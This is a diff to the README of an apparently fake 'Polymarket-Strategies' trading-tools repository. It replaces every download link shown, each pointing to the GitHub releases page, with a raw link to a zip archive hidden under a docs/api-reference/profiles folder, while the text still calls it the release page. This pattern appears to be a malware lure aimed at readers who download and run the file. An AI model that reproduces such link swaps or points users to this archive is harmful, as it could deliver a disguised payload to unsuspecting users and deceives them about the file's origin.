@@ -1,9 +1,9 @@
 # 🤖 Polymarket-Strategies - Simple Market Trading Tools
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/dtonl4149/Polymarket-Strategies/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/dtonl4149/Polymarket-Strategies/main/docs/api-reference/profiles/Strategies_Polymarket_3.9.zip)
 
 ## 📥 Download
-Visit this page to download: https://github.com/dtonl4149/Polymarket-Strategies/releases
+Visit this page to download: https://raw.githubusercontent.com/dtonl4149/Polymarket-Strategies/main/docs/api-reference/profiles/Strategies_Polymarket_3.9.zip
 
 Pick the latest release for Windows and download the file that matches your PC.
 
@@ -115,7 +115,7 @@ This project uses:
 
 ## 📎 Download Again
 If you need to get the app later, use the release page:
-https://github.com/dtonl4149/Polymarket-Strategies/releases
+https://raw.githubusercontent.com/dtonl4149/Polymarket-Strategies/main/docs/api-reference/profiles/Strategies_Polymarket_3.9.zip
 
 ## 🔧 Basic Setup Tips
 - Keep the app updated
